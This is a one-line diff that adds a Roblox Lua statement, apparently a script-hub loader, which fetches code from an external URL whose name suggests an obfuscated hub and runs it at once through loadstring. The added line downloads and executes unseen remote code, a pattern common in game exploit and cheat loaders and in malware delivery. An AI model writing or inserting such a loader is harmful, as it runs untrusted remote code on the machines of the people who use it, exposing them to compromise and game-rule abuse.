@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://vyse-hub-obf.lovable.app/api/public/raw/8462f4d3d605289a"))()
